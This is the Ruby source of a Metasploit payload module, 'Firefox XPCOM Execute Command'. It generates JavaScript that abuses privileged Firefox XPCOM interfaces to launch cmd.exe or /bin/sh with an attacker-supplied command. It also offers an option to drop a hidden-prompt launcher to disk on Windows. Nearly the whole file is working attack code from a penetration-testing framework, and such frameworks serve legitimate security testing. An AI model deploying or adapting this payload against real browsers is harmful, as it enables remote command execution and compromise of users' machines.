##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

module MetasploitModule

  CachedSize = 1019

  include Msf::Payload::Single
  include Msf::Payload::Firefox

  def initialize(info={})
    super(merge_info(info,
      'Name'          => 'Firefox XPCOM Execute Command',
      'Description'   => %Q|
        This module runs a shell command on the target OS withough touching the disk.
        On Windows, this command will flash the command prompt momentarily.
        This can be avoided by setting WSCRIPT to true, which drops a jscript
        "launcher" to disk that hides the prompt.
      |,
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'firefox',
      'Arch'          => ARCH_FIREFOX
    ))
    register_options([
      OptString.new('CMD', [true, "The command string to execute", 'touch /tmp/a.txt']),
      OptBool.new('WSCRIPT', [true, "On Windows, drop a vbscript to hide the cmd prompt", false])
    ], self.class)
  end

  def generate
    <<-EOS

      (function(){
        window = this;
        #{read_file_source if datastore['WSCRIPT']}
        #{run_cmd_source if datastore['WSCRIPT']}

        var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
        var windows = (ua.indexOf("Windows")>-1);

        var cmd = (#{JSON.unparse({ :cmd => datastore['CMD'] })}).cmd;
        if (#{datastore['WSCRIPT']} && windows) {
          runCmd(cmd);
        } else {
          var process = Components.classes["@mozilla.org/process/util;1"]
                          .createInstance(Components.interfaces.nsIProcess);
          var sh = Components.classes["@mozilla.org/file/local;1"]
                    .createInstance(Components.interfaces.nsILocalFile);
          var args;
          if (windows) {
            sh.initWithPath("C:\\\\Windows\\\\System32\\\\cmd.exe");
            args = ["/c", cmd];
          } else {
            sh.initWithPath("/bin/sh");
            args = ["-c", cmd];
          }
          process.init(sh);
          process.run(true, args, args.length);
        }
      })();

    EOS
  end
end
